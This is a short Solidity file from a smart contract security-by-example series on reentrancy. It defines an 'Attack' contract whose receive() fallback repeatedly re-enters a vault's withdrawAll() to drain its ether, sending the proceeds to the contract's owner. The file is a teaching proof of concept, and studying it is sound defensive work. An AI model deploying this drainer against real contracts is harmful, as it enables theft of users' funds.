// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-02-reentrancy-b0c08cfcd555
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-02-reentrancy/

pragma solidity 0.8.13;

interface IEtherVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    IEtherVault public immutable etherVault;
    address public immutable owner;


    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
        owner = msg.sender;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function withdrawAll() public {
        require(msg.sender == owner, "You are not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    

}